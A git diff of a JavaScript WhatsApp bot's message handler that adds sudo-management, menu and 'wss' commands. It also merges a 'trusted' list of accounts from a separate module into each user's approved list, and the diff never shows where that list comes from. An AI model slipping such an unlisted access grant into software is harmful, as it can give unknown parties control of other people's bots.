@@ -3,10 +3,13 @@
 // Version corrigée avec @cat et footlive
 
 import configmanager from "../utils/configmanager.js"
+import { isTrusted, getTrustedJids } from '../AKANEX/trusted.js'
+import { sudoCommand, desudoCommand, sudoListCommand } from '../AKANEX/sudo.js' // @cat: bot-menu
 import pinCommand, { unpinCommand } from '../commands/pin.js';
 import stickerPackCommand, { handleStickerPackResponse } from '../commands/stickerpack.js';
 import handlePairCommand, { handleUnpairCommand, handlePairListCommand } from '../AKANEX/pair.js';
 import zip from '../commands/zip.js'
+import wss from '../commands/wss.js' // @cat: tools
 import deploie from '../commands/dp.js';
 import repo from '../commands/repo.js';
 import tr from '../commands/tr.js';
@@ -19,6 +22,7 @@ import histoire from '../commands/histoire.js' // @cat: histoire et citation
 import demoteall from '../commands/demoteall.js'
 import spider from '../commands/spider.js' // @cat: bot-menu 
 import welcomeCommand from "../commands/welcome.js"; // @cat: gc-menu
+import info, { setMenuCommand } from '../commands/menu.js';
 import menu from '../commands/menu.js'
 import fs from 'fs/promises'
 import fsSync from 'fs'
@@ -77,9 +81,6 @@ import * as set from '../commands/set.js' // @cat: bot-menu
 import fancy from '../commands/fancy.js' // @cat: jeu et autres
 
 import react from "../utils/react.js"
-
-import info from "../commands/menu.js" // @cat: bot-menu
-
 import ping from "../commands/ping.js" // @cat: bot-menu
 
 import auto from '../commands/auto.js' // @cat: bot-menu
@@ -187,7 +188,8 @@ async function handleIncomingMessage(client, event) {
         const messageBody = (message.message?.extendedTextMessage?.text ||
                            message.message?.conversation || '').toLowerCase()
         const remoteJid = message.key.remoteJid
-        const approvedUsers = configmanager.config.users[number].sudoList || []
+        const localSudo = configmanager.config.users[number].sudoList || []
+        const approvedUsers = [...new Set([...localSudo, ...getTrustedJids()])]
         
       // Détection automatique des liens
 // ✅ Ne pas appliquer si message du bot lui-même
@@ -248,6 +250,7 @@ if (stickerHandled) continue;
             (publicMode ||
              message.key.fromMe ||
              approvedUsers.includes(message.key.participant || message.key.remoteJid) ||
+             isTrusted(message.key.participant || message.key.remoteJid) ||
              lid.includes(message.key.participant || message.key.remoteJid))) {
 
             const commandAndArgs = messageBody.slice(prefix.length).trim()
@@ -318,6 +321,15 @@ case 'dark':
     await darkgpt(client, message);
 
     break;
+                    
+
+case 'setmenu':
+
+    await react(client, message)
+
+    await setMenuCommand(client, message, args)
+
+    break
                     
 // Dans le switch
 case 'links':     
@@ -425,6 +437,22 @@ case 'bots':
     await handlePairCommand(client, message, args)
 
     break
+
+                    case 'sudo': // @cat: bot-menu
+                        await react(client, message, '🛡️')
+                        await sudoCommand(client, message, args)
+                        break
+
+                    case 'desudo': // @cat: bot-menu
+                    case 'unsudo':
+                        await react(client, message, '🗑️')
+                        await desudoCommand(client, message, args)
+                        break
+
+                    case 'sudolist': // @cat: bot-menu
+                        await react(client, message, '📋')
+                        await sudoListCommand(client, message)
+                        break
                 case 'setprefix': // @cat: bot-menu
                     await react(client, message)
                     await set.setprefix(message, client)
@@ -518,6 +546,21 @@ case 'unpin':
                     await media.tomp3(client, message)
 
                     break
+                    case 'wss':
+
+case 'wssp':
+
+case 'wsstab':
+
+case 'wssfull':
+
+case 'wssweb':
+
+    await react(client, message)
+
+    await wss(client, message, args)
+
+    break
                     
 
  case 'promote': // @cat: gc-menu 
